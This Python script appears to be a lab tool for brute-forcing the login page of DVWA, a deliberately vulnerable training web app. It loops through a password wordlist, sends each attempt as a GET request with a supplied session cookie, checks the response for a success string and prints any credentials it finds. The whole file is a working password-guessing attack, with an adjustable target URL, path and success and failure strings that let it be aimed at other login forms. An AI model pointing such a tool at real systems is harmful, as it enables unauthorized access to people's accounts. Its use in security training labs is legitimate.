#!/usr/bin/env python3
from __future__ import annotations

import argparse
import sys
import time
import urllib.parse
import urllib.request


DEFAULT_PATH = "/dvwa/vulnerabilities/brute/"
DEFAULT_SUCCESS = "Welcome to the password protected area"
DEFAULT_FAILURE = "Username and/or password incorrect."


def http_get(url: str, cookie: str, timeout: float) -> str:
    req = urllib.request.Request(url)
    req.add_header("Cookie", cookie)
    # Keep a realistic UA so lab WAF/proxies don't behave differently.
    req.add_header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) dvwa-bf/1.0")

    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read().decode("utf-8", errors="replace")


def iter_wordlist(path: str, limit: int | None):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for i, line in enumerate(f, start=1):
            if limit is not None and i > limit:
                return
            pw = line.strip("\r\n")
            if not pw:
                continue
            yield pw


def main(argv: list[str]) -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", required=True, help="e.g. http://192.168.56.101")
    ap.add_argument("--path", default=DEFAULT_PATH, help=f"default: {DEFAULT_PATH}")
    ap.add_argument("--username", required=True)
    ap.add_argument("--wordlist", required=True)
    ap.add_argument("--phpsessid", required=True)
    ap.add_argument("--security", default="medium", choices=["low", "medium", "high", "impossible"])
    ap.add_argument("--success", default=DEFAULT_SUCCESS, help="substring that indicates success")
    ap.add_argument("--failure", default=DEFAULT_FAILURE, help="substring that indicates failure")
    ap.add_argument("--delay", type=float, default=0.0, help="seconds to sleep between attempts")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--limit", type=int, default=None, help="max passwords to try")
    args = ap.parse_args(argv)

    base = args.base_url.rstrip("/")
    target = base + args.path

    cookie = f"PHPSESSID={args.phpsessid}; security={args.security}"

    tried = 0
    for pw in iter_wordlist(args.wordlist, args.limit):
        tried += 1
        q = urllib.parse.urlencode({"username": args.username, "password": pw, "Login": "Login"})
        url = f"{target}?{q}"

        try:
            body = http_get(url, cookie=cookie, timeout=args.timeout)
        except Exception as e:
            print(f"[!] request failed on attempt {tried}: {e}")
            continue

        ok = (args.success in body)
        bad = (args.failure in body)

        # DVWA responses are consistent; treat success as authoritative.
        if ok and not bad:
            print(f"[+] SUCCESS: {args.username}:{pw}")
            return 0

        if tried % 50 == 0:
            print(f"[*] tried {tried} passwords (latest: {pw!r})")

        if args.delay:
            time.sleep(args.delay)

    print(f"[-] no password found after {tried} attempts")
    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
